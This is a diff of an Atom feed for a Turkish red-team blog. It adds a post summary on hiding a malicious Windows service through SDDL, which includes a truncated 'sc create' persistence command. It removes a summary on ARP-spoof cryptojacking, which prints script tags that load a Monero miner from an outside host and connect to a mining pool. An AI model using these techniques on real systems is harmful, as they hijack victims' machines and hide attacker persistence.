@@ -3,8 +3,8 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
   <id>http://localhost:4000/</id>
   <title>Yugen</title>
-  <subtitle>mimikatzura, Red Teamer</subtitle>
-  <updated>2023-08-24T22:32:15+03:00</updated>
+  <subtitle>?</subtitle>
+  <updated>2023-08-25T07:46:11+03:00</updated>
   <author>
     <name></name>
     <uri>http://localhost:4000/</uri>
@@ -17,6 +17,49 @@
   <icon>/assets/img/favicons/favicon.ico</icon>
   <logo>/assets/img/favicons/favicon-96x96.png</logo>
 
+
+  
+  <entry>
+    <title>SDDL ? Soc Analistin Kâbusu</title>
+    <link href="http://localhost:4000/posts/ssdl-soc-analistin-kabusu/" rel="alternate" type="text/html" title="SDDL ? Soc Analistin Kâbusu" />
+    <published>2023-08-25T00:00:00+03:00</published>
+  
+    <updated>2023-08-25T00:00:00+03:00</updated>
+  
+    <id>http://localhost:4000/posts/ssdl-soc-analistin-kabusu/</id>
+    <content src="http://localhost:4000/posts/ssdl-soc-analistin-kabusu/" />
+    <author>
+      <name>who</name>
+    </author>
+
+  
+    
+    <category term="persistence" />
+    
+    <category term="attacks" />
+    
+  
+
+  
+    <summary>
+      
+
+
+
+
+
+      Security Descriptor Definition Language Kabaca SCM ile (Service Control Manager) sistem üzerinde Service oluşturmayı ve oluşturulan servisler üzerinde işlemler yapılabiliyor. Genel anlatım servis oluşturup launch etmek üzerine ancak burada mevcut servisi gizlemek üzerine kullanacağız.
+
+
+  SDDL Everyone olarak yetkilendirilmeli.
+
+
+C:\Users\test\Desktop\sc create kotu_isler start=auto binpath=%
+[...
+    </summary>
+  
+
+  </entry>
 
   
   <entry>
@@ -206,56 +249,6 @@ ASLR ve DEP korumalarının devre dışı olması durumunda genel olarak 2 şeki
 
 
   Tekniğin çalışabilmesi için hedef cihazların DNS ayar...
-    </summary>
-  
-
-  </entry>
-
-  
-  <entry>
-    <title>Enterprise Networklerde Coin Mining</title>
-    <link href="http://localhost:4000/posts/enterprise-networklerde-coin-mining/" rel="alternate" type="text/html" title="Enterprise Networklerde Coin Mining" />
-    <published>2023-07-12T00:00:00+03:00</published>
-  
-    <updated>2023-07-12T00:00:00+03:00</updated>
-  
-    <id>http://localhost:4000/posts/enterprise-networklerde-coin-mining/</id>
-    <content src="http://localhost:4000/posts/enterprise-networklerde-coin-mining/" />
-    <author>
-      <name>who</name>
-    </author>
-
-  
-    
-    <category term="internal" />
-    
-    <category term="attacks" />
-    
-    <category term="monero" />
-    
-    <category term="coin" />
-    
-    <category term="XMR" />
-    
-    <category term="mining" />
-    
-    <category term="mitigate" />
-    
-  
-
-  
-    <summary>
-      
-
-
-
-
-
-      Temelde ARP Spoof ile gerçekleşir. Saldırgan yerel ağda arp spoof başlatır. Saldırı sonucunda kendi mac adresi kurbanlar tarafından bilinir. Kendi vermiş olduğu javascript dosyasını kurban browserlar çalıştırır.
-&amp;lt;script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"&amp;gt;&amp;lt;/script&amp;gt;
-&amp;lt;script&amp;gt;
-    server = "wss://f.xmrminingproxy.com:8181";
-    var pool = "moneroocean.stream";...
     </summary>
   
 
